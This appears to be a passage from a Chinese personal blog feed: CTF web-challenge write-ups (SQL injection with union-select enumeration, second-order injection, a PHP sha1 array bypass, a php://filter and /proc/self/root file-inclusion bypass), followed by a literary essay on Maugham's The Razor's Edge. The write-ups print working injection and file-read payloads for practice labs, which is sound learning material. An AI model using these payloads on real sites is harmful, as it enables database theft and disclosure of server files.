class="hljs-regexp">/qq_45521281/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">106647880</span><br>https:<span class="hljs-regexp">//</span>syunaht.com<span class="hljs-regexp">/p/</span><span class="hljs-number">1354079185</span>.html<br>https:<span class="hljs-regexp">//</span>www.shawroot.cc/<span class="hljs-number">1186</span>.html<br></code></pre></td></tr></table></figure><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p><img src="/img/lifeonmars1.png" alt="lifeonmars1"></p><p>源码好像没啥信息，抓包看看：</p><p><img src="/img/lifeonmars2.png" alt="lifeonmars2"></p><p>注意这个<code>URL:/query?search=amazonis_planitia&amp;&#123;&#125;&amp;_=1703252641401</code></p><p>在第一个字段加了个<code>&#39;%23</code>:</p><p><img src="/img/lifeonmars3.png" alt="lifeonmars3"></p><p>有反应，把单引号直接去了：</p><p><img src="/img/lifeonmars5.png" alt="lifeonmars5"></p><p><code>%23</code>这个注释符确实起作用了。加了注释符直接把后面全删掉回显也是正常的。后面想着直接oder by 判断列数了，但burp上操作一直给我回显400，他妈的。只能直接在网页操作：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">/query?<span class="hljs-attr">search=</span>olympus_mons <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>2时回显正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/query?search=olympus_mons union <span class="hljs-keyword">select</span> 123,456<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/img/lifeonmars6.png" alt="lifeonmars6"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/query?<span class="hljs-keyword">search</span>=olympus_mons <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> version(),<span class="hljs-keyword">database</span>()#<br></code></pre></td></tr></table></figure><p>数据库:<code>aliens</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/query?<span class="hljs-keyword">search</span>=amazonis_planitia <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;aliens&#x27;</span><br></code></pre></td></tr></table></figure><p>表一大堆：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">amazonis_planitia,</span>arabi<span class="hljs-built_in">a_terra</span>,chryse_planitia,hellas_basin,hesperi<span class="hljs-built_in">a_planum</span>,noachis_terra,olympus_mons,tharsis_rise,utopi<span class="hljs-built_in">a_basin</span><br></code></pre></td></tr></table></figure><p>后面懒得查了直接找了<code>wp</code>。。这东西能直接用<code>sqlmap</code>跑出来而且表不是<code>aliens</code>而是<code>alien_code</code>这个库，而且<code>code</code>这个表不止一个。。所以要这么查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/query?search=amazonis_planitia union <span class="hljs-keyword">select</span> 1,group_concat(<span class="hljs-built_in">id</span>,code) from alien_code.code<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>唉，一个简单的二次注入，结果被我想麻烦了浪费好长时间。</p><p>先注册了<code>admin</code>,<code>admin</code>。<code>info</code>那里放了个<code>1</code>。然后注册了<code>admin&#39;#``admin</code>，登进去发现<code>info</code>字段有东西：</p><p><img src="/img/octtwicesql1.png" alt="octtwicesql1"></p><p>我注册的<code>admin&#39;#</code>登录成了<code>admin</code>用户了，一开始以为是登录的锅：<code>&#39;#</code>直接把后面的都注释掉了，所以尝试了<code>admin&#39;#</code>然后输个错误的密码看看能不能登录：</p><p>干，登不上去。</p><p>后面想了想应该是登录时存在二次注入：把输入的用户名和密码存起来然后取出，<code>admin&#39;#</code>就变成<code>admin</code>了。但这里怎么利用是个问题。。</p><p>我一开始以为要根据页面回显去一点一点判断，比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))=99,1,2)#</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>然后根据登录后的页面中<code>info</code>的内容是否和用户名<code>1</code>的内容一样判断：</p><p>如果<code>if</code>这个条件是对的<code>info</code>字段就会回显和<code>1</code>同样的内容。但这意味着我对每个<code>payload</code>都要进行：注册加登录的操作。。</p><p>后面看了<code>wp</code>，🐎的这里直接用<code>UNION</code>就直接能回显：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">12345</span> <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/img/octtwicesql2.png" alt="octtwicesql2"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆库：ctftraining<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select database() #</span><br><span class="hljs-string">//爆表</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;ctftraining&#x27;</span> #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆列<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#</span><br><span class="hljs-string">//flag</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag #<br><br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p>进去什么也没有，<code>hint</code>提示换一种请求方式，改成POST：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;HTTP/1.1 405 Method Not Allowed&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>] !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();  <span class="hljs-comment">// collect information from phpinfo!</span><br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>简单<code>hash</code>强等于绕过：</p><p><code>roam1[]=1&amp;roam2[]=2</code></p><p><img src="/img/roamwhat1.png" alt="roamwhat1"></p><h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这个<code>require_once</code>，顺便复习下几个常用的文件包含函数：</p><blockquote><p>include()函数当遇到错误的信息时，会进行报错，但仍然会继续执行下面的代码<br>include_once()函数与include()函数功能类似，但所包含的信息只执行一次<br>require()函数当遇到错误的信息时，会进行报错，并且不会再继续执行下面的代码<br>require_once()函数与require()函数功能类似，但所包含的信息只执行一次</p></blockquote><p>绕过参考<code>https://www.anquanke.com/post/id/213235</code></p><p>大致就是当软链接多到一定程度（路径嵌套够多）后可以实现绕过，比如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>proc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>xxxx<br><br></code></pre></td></tr></table></figure><p>这种路径</p><p><code>/proc/self/root</code>这东西其实就是<code>/</code>，多层嵌套之后还是<code>/</code>:</p><p><img src="/img/procroot.png" alt="procroot"></p><p>所以对于这种路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>proc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>xxxx<br><br></code></pre></td></tr></table></figure><p>其实还是<code>/var/www/html/xxxx</code></p><p>尝试读取：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><p><code>php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p><p>就行。</p><p>后面看有的师傅用这种方法：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/nice/</span>..<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag.php<br><br></code></pre></td></tr></table></figure><p><code>/proc/self/cwd/</code>这东西直接指向了当前的工作目录，就用不着猜<code>/var/www/html/</code>了。另外<code>nice</code>这个东西换成啥都行，只要接下来通过<code>..</code>再跳回到根目录就行。但注意<code>proc/self/cwd</code>这东西不能改成<code>var/www/html</code>。因为<code>payload</code>中一定要存在符号链接：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">这种也行：<br><span class="hljs-regexp">/nice/</span>..<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重读毛姆&lt;刀锋&gt;，和一点感想</title>
    <link href="/2023/12/25/2023-12-20-%E9%87%8D%E8%AF%BB%E6%AF%9B%E5%A7%86%E3%80%8A%E5%88%80%E9%94%8B%E3%80%8B%EF%BC%8C%E5%92%8C%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/"/>
    <url>/2023/12/25/2023-12-20-%E9%87%8D%E8%AF%BB%E6%AF%9B%E5%A7%86%E3%80%8A%E5%88%80%E9%94%8B%E3%80%8B%EF%BC%8C%E5%92%8C%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<p>抽空把&lt;刀锋&gt;又读了一遍，随便写点感想。</p><span id="more"></span><hr><blockquote><p> 利刃锋缘尤难攀越；智者辄谓得救之路乃艰途也。——《羯陀奥义书》</p><p> 叩问生命的终极意义是困难的，犹如行在刀锋。</p></blockquote><p>​<strong>磨蹭了一个多月还没写完，这个坑以后慢慢填吧，唉:(</strong></p><p><img src="/img/therages.jpg" alt="therages"></p><p>​    读完后算了算，这本书我至少读过四遍了。毛姆会讲故事，读过他的《月亮和六便士》，《刀锋》，《寻欢作乐》，《面纱》，《人性的枷锁》，《圣诞假日》(这个感觉知名度挺低的，在图书馆溜达被我碰到了)。从《刀锋》中的拉里，到《月亮与六便士》中的斯特里克兰德再到《人性的枷锁》中的凯里，我觉得这些作品都在讨论一个问题：<strong>一生要如何度过？</strong></p><p>​&lt;刀锋&gt;内容其实挺好概括的：拉里为了做自己想做的事放弃了很多。</p><blockquote><p>​“认为印度人把世界看作是幻觉，这是错的；印度人并不如此；他们只说世界的真实和绝对的真实不能同日而语。玛雅只是那些热衷的思想家编出来的，借此解释无穷怎样创造有穷。沙姆卡拉，他们里面最聪明的一个，断言这是一个解决不了的谜团。你知道，困难在于解释为什么婆罗门要创造世界。婆罗门是存在、福泽和智慧；它是不可改变的；它一直在这里，而且永远保持静止，它什么都不缺，它什么都不需要，因此既不知道变易，也不知道争夺，它是十全十美的；既然如此，它为什么要创造世界呢？你假如问这个问题，你得到的一般解答是，绝对创造世界是闹着玩的，并不带有什么目的。可是，当你想到洪水和饥谨，地震和飓风，想到折磨人体的一切疾病，你的正义感就会爆发出来，认为这么多骇人听闻的东西当初怎么会这样随随便便就创造出来。西里·甘乃夏心地太忠厚了，所以不相信这种学说；他把世界看作是绝对的表现，而且是它的完善的泛滥。他教导说，神没法子不创造，而世界则是神性的表现。我问他，既然世界是一个十全十美的主宰的本性表现，为什么它是这样的可恨，使众生的唯一合理出路就是摆脱它的束缚。西里·甘乃夏回答说，尘世的满足都是暂时的，只有无限能提供持久的快乐和幸福。但是，时间的没完没了并不能使善更加善些，也不能使自更加白些。如果中午的蔷薇失去它在清晨时的娇美，它在清晨时的娇美仍然是真实的。世间万事万物都有个完，我们除非是傻子才要求事物永久不变，但是，如果我们不抓着手里的东西及时享受它，肯定说我们就更傻了。如果交易是事物的本性，我们会认为把这一条作为人生哲学的前提，是最合情合理了。我们谁也不能两次濯足于同一的河流，然而，河水流去，继之流来的水仍旧一样清凉沁人。</p></blockquote><blockquote><p>​我拿起拉里的书，看看目录。我的一本在我离开里维埃拉时还没有寄来，现在在几天之内没法看到。书写得完全出乎我的意料，是一本论文集，篇幅和利顿·斯特雷奇的《维多利亚名人传》相仿佛，论述了若干有名人物。他挑选的人使我迷惑不解。有一篇论述罗马独裁者苏拉，在独揽大权之后，退位归隐，一篇论建立帝国的蒙古征服者阿克巴尔；一篇论吕本，一篇论歌德，还有一篇论切斯特菲尔德勋爵，那个搞文学的。显然每篇文章都需要读许多书，无怪拉里要花这么长的时间才能写成，可是，我不懂得为什么他认为值得在这上面花这么多时间，也不懂得他为什么选择这些人来研究。接着我想起来，他们每个人都以各自的方式再此生获得了卓越不凡的成绩。我想这就是拉里感兴趣的缘由。他很好奇，想知道这一切到最终归结的意味。</p></blockquote><p>​ 最开始读小说都是看的一些侦探小说，钱德勒&lt;漫长的告别&gt;，&lt;长眠不醒&gt;，&lt;再见，吾爱&gt;。后面又开始读布洛克的&lt;八百万种死法&gt;(没读完)和&lt;酒吧关门之后&gt;。我特别喜欢他们那种<code>硬汉</code>类型的主角，从菲利普马洛到马修•斯卡德。</p><p>​我喜欢  ，甚至后来觉得他们抽烟喝酒帅的不行以至于萌生了‘ 嗯，我也要整点儿’的想法。后面想了想我其实可能是喜欢他们的写作风格：文笔简洁明快。这也是我后面喜欢读海明威的原因。</p><p>​感受一下&lt;老人与海&gt;的结尾：</p><blockquote><p>​那天下午，露台饭店来了一群旅游者，有个女人朝下面的海水望去，看见在一些空气酒听和死梭子鱼之间，有一条又粗又长的白色脊骨，一端有条巨大的尾巴，当东风在港外不断地掀起大浪的时候，这尾巴随着潮水瓶落、摇摆。</p><p>​ “那是什么？”她问一名侍者，指着那条大鱼的长长的脊骨，它如今仅仅是垃圾，只等潮水来把它带走了。</p><p>​ “Ｔｉｂｕｒｏｎ，”侍者说，“Ｅｓｈａｒｋ。”他打算解释这事情的经过。</p><p>​“我不知道鲨鱼有这样漂亮的尾巴，形状这样美观。”</p><p>​“我也不知道，”她的男伴说。</p><p>​ 在大路另一头老人的窝棚里，他又睡着了。他依旧脸朝下躺着，孩子坐在他身边，守着他。</p><p>​老人正梦见狮子。</p></blockquote><p>​</p><p>​以前觉得”读书有什么用？读完就忘了，我也写不出什么多漂亮的东西”。现在我觉得读书并不是要背住内容，也不一定非要写出点东西。<br>​罗翔有句话我感觉挺好的，大致意思就是读书就像吃饭。你吃下去的东西具体转化成什么了没人说的明白，但确确实实成为你身体的一部分了。</p><blockquote><p>世界上任何书籍都不能带给你好运，但它们能让你悄悄成为你自己。—赫尔曼 · 黑塞</p></blockquote><p>​我觉得文学的本质让人体会到发生在他人周围的事，会有自己的思考和感悟。文字也不一定要多优美，拿《战争与和平》来说，全篇并没有什么华丽地描写，平淡地描述了1805-20年间俄国贵族生活&#x2F;战场，里面的人物形形色色，历史就像车轮冷酷无情的碾过路边的小草，就连拿破仑这种英雄人物在书中都不过是一个凡夫俗子般的将军，但图申这个小小的炮兵下士却又闪耀着人性的光辉。</p><p>​     </p><p>​考斯蒂也是个很有意思的角色：一个波兰贵族军官，不知道什么原因跑到煤矿里靠挖煤赚钱，从外表到言行都是彻头彻尾的粗人，却有这么一段描写：</p><blockquote><p> “但我知道他在说谎，他绝对知道自己当时在说什么。他懂得很多。当时他确实喝醉了，然而他的眼神，那张丑陋脸庞上心醉神迷的表情，却不仅出于酒精的作用，应该还有和其他更多原因。他第一次这样开口讲话时，那些内容让我至今无法忘怀，因为我听到以后简直被吓坏了。他说这个世界并不是创造生成之物，因为’空无’不会产生任何东西。世界只是永恒本质的彰显。好吧，这也没错。但他随后又添了一句，说恶是神圣的直接彰显，就像善一样。在那个破败、吵闹的小饭馆里，在机械钢琴的舞曲背景音下，听到这些话的感觉实在很怪诞“</p></blockquote><p>​再说回艾略特，明明死到临头了还在为无法参加派对发愁；为人虚伪势利</p><blockquote></blockquote><p>​他一生成功与否又要怎么定义呢？谁又有权力定义呢？</p><p>​当时读&lt;月亮与六便士&gt;，里面有一部分挺有意思：</p><blockquote><p>​我给蒂阿瑞讲了一个我在圣托玛斯医院认识的人的故事。这是个犹太人，姓阿伯拉罕。他是个金黄头发、身体粗壮的年轻人。性格腼腆，对人和气，但是很有才能。他是靠着一笔奖学金入学的，在五年学习期间，任何一种奖金只要他有机会申请就绝对没有旁人的份儿。他先当了住院内科医生，后来又当了住院外科医生。没有人不承认他的才华过人。最后他被选进领导机构中，他的前程已经有了可靠的保证。按照世情推论，他在自己这门事业上肯定会飞黄腾达、名利双收的。在正式上任以前，他想度一次假；因为他自己没有钱，所以在一艘开往地中海的不定期货船上谋了个医生位置。这种货轮上一般是没有医生的，只是由于医院里有一名高级外科医生认识跑这条航线的一家轮船公司的经理，货轮看在经理情面上才录用了阿伯拉罕。<br>​几个星期以后，医院领导人收到一份辞呈，阿伯拉罕声明他决定放弃这个人人嫉羡的位置。这件事使人们感到极其惊诧，千奇百怪的谣言不胫而走。每逢一个人干出一件出人意料的事，他的相识们总是替他想出种种最令人无法置信的动机。但是既然早就有人准备好填补他留下的空缺，阿伯拉罕不久也就被人遗忘了。以后再也没人听到他的任何消息。这个人就这样从人们的记忆里消失了。<br>​大约十年之后，有一次我乘船去亚历山大港。即将登陆之前，一天早上，我被通知同其他旅客一起排好队，等待医生上船来检查身体。来的医生是个衣履寒酸、身体肥硕的人。当他摘下帽子以后，我发现这人的头发已经完全秃了。我觉得仿佛过去在什么地方见过他。忽然，我想起来了。<br>​“阿伯拉罕，”我喊道。<br>​他转过头来，脸上显出惊奇的神色。愣了一会儿，他也认出我来，立刻握住我的手。在我们两人各自惊叹了一番后，他听说我准备在亚历山大港过夜，便邀请我到英侨俱乐部去吃晚饭。在我们会面以后，我再次表示在这个地方遇到他实在出乎我的意料之外。他现在的职务相当低微，他给人的印象也很寒酸。这以后他给我讲了他的故事。在他出发到地中海度假的时候，他一心想的是再回伦敦去，到圣·托玛斯医院去就职。一天早晨，他乘的那艘货轮在亚历山大港靠岸，他从甲板上看着这座阳光照耀下的白色城市，看着码头上的人群。他看着穿着褴褛的轧别丁衣服的当地人，从苏丹来的黑人，希腊人和意大利人成群结队、吵吵嚷嚷，土耳其人戴着平顶无檐的土耳其小帽，他看着阳光和碧蓝的天空。就在这个时候，他的心境忽然发生了奇异的变化。他无法描述这是怎么一回事。事情来得非常突兀，据他说，好像晴天响起一声霹雳；但他觉得这个譬喻不够妥当，又改口说好像得到了什么启示。他的心好像被什么东西揪了一下。突然间，他感到一阵狂喜，有一种取得无限自由的感觉。他觉得自己好像回到了老家，他当时当地就打定主意，今后的日子他都要在亚历山大度过了。离开货轮并没有什么困难；二十四小时以后，他已经带着自己的全部行李登岸了。<br>​“船长一定会觉得你发疯了，”我笑着说。<br>​“别人爱怎么想就怎么想，我才不在乎呢。做出这件事来的不是我，是我身体里一种远比我自己的意志更强大的力量。上岸以后，我四处看了看，想着我要到一家希腊人开的小旅馆去；我觉得我知道在哪里能找到这家旅馆。你猜怎么着？我一点儿也没有费劲儿就走到这家旅馆前边，我一看见这地方马上就认出来了。”<br>​“你过去到过亚历山大港吗？”<br>​“没有。在这次出国前我从来没有离开过英国。”<br>​不久以后，他就在公立医院找到个工作，从此一直待在那里。<br>​“你从来没有后悔过吗？”<br>​“从来没有。一分钟也没有后悔过。我挣的钱刚够维持生活，但是我感到心满意足。我什么要求也没有，只希望这样活下去，直到我死。我生活得非常好。”<br>​第二天我就离开了亚历山大港，直到不久以前我才又想起阿伯拉罕的事。那是我同另外一个行医的老朋友，阿莱克·卡尔米凯尔一同吃饭的时候。卡尔米凯尔回英国来短期度假，我偶然在街头上遇见了他。他在大战中工作得非常出色，荣获了爵士封号。我向他表示了祝贺。我们约好一同消磨一个晚上，一起叙叙旧。我答应同他一起吃晚饭，他建议不再约请别人，这样我俩就可以不受干扰地畅谈一下了。他在安皇后街有一所老宅子，布置很优雅，因为他是一个很富于艺术鉴赏力的人。我在餐厅的墙上看到一幅贝洛托的画，还有两幅我很羡慕的佐范尼的作品。当他的妻子，一个穿着金色衣服、高身量、样子讨人喜欢的妇女离开我们以后，我笑着对他说，他今天的生活同我们在医学院做学生的时代相比，变化真是太大了。那时，我们在威斯敏斯特桥大街一家寒酸的意大利餐馆吃一顿饭都认为是非常奢侈的事。现在阿莱克·卡尔米凯尔在六七家大医院都兼任要职，据我估计，一年可以有一万镑的收入。这次受封为爵士，只不过是他迟早要享受到的第一个荣誉而已。<br>​“我混得不错，”他说，“但是奇怪的是，这一切都归功于我偶然交了一个好运。”<br>​“我不懂你说的是什么意思？”<br>​“不懂？你还记得阿伯拉罕吧？应该飞黄腾达的本该是他。做学生的时候，他处处把我打得惨败。奖金也好，助学金也好，都被他从我手里夺去；哪次我都甘拜下风。如果他这样继续下去，我现在的地位就是他的了。他对于外科手术简直是个天才。谁也无法同他竞争。当他被指派为圣·托玛斯附属医学院注册员的时候，我是绝对没有希望进入领导机构的。我只能开业当个医生，你也知道，一个普通开业行医的人有多大可能跳出这个槽槽去。但是阿伯拉罕却让位了，他的位子让我弄到手了。这样就给了我步步高升的机会了。”<br>​“我想你说的话是真的。”<br>​“这完全是运气。我想，阿伯拉罕这人心理一定变态了。这个可怜虫，一点儿救也没有了。他在亚历山大港卫生部门找了个小差事——检疫员什么的。有人告诉我，他同一个丑陋的希腊老婆子住在一起，生了半打长着瘰疬疙瘩的小崽子。所以我想，问题不在于一个人脑子聪明不聪明，真正重要的是要有个性。阿伯拉罕缺少的正是个性。”<br>​个性？在我看来，一个人因为看到另外一种生活方式更有重大的意义，只经过半小时的考虑就甘愿抛弃一生的事业前途，这才需要很强的个性呢。贸然走出这一步，以后永不后悔，那需要的个性就更多了。但是我什么也没说。阿莱克·卡尔米凯尔继续沉思着说：<br>​“当然了，如果我对阿伯拉罕的行径故作遗憾，我这人也就太虚伪了。不管怎么说，正因为他走了这么一步，才让我占了便宜。”他吸着一支长长的寇罗纳牌哈瓦那雪茄烟，舒适地喷着烟圈。“但是如果这件事同我个人没有牵连的话，我是会为他虚掷才华感到可惜的。一个人竟这样糟蹋自己实在太令人心痛了。”<br>​我很怀疑，阿伯拉罕是否真的糟蹋了自己。做自己最想做的事，生活在自己喜爱的环境里，淡泊宁静、与世无争，这难道是糟蹋自己吗？与此相反，做一个著名的外科医生，年薪一万镑，娶一位美丽的妻子，就是成功吗？我想，这一切都取决于一个人如何看待生活的意义，取决于他认为对社会应尽什么义务，对自己有什么要求。但是我还是没有说什么；我有什么资格同一位爵士争辩呢？</p></blockquote><p>​</p><p>​也许人生的来处已无迹可寻，生命的去处似乎也是波澜不惊，但梦想和意义这件事，或者可以不那么高高在上，就放在兜里，放在饭桌上，放在你抬头看天低头读书听歌这些琐事上。</p><blockquote><p>这就是我的故事的结束。我从没有听到拉里的消息，也不指望听到。由于他一般都按照自己的打算行事，我想他回到美国以后，可能就在汽车修配行里找一个工作，然后当卡车司机，直到他获得关于他阔别多年的这个国家的知识为止。在达到这项目的以后，他很可能把开出租汽车的怪想法付诸实施：诚然，这在当时不过是我们在咖啡馆里对面坐时随便说的一句玩笑话，但是，如果他当真这样做起来，我也丝毫不感到奇怪；我而且后来每次在纽约雇出租汽车时总要把司机看一眼，指望说不定会和拉里的那双深陷的庄重而微笑的眼睛碰上。我从来没有碰到过。大战爆发了。他年纪不小，飞行当然谈不上，但可能重新去开卡车，在国内或在国外；也可能在一家工厂做工。想来他会在空余的时间写一本书，试图阐述他的人生体会和对自己同类的教导；可是，如果在写的话，也要等很长的时间才会完成。他有的是时间；岁月在他身上没有留下痕迹；不管从哪一方面说，他还是个青年。<br>他没有野心，不要名；他最厌恶成为知名人士；所以很可能安心安意地过着自己挑选的生活，我行我素，别无所求。他为人太谦虚了，决不肯使自己成为别人的表率；但是，他也许会想到，一些说不上来的人会象飞蛾扑灯一样被吸引到他身边来，并且逐渐和他的热烈信仰取得一致，认为人生最大的满足只能通过精神生活来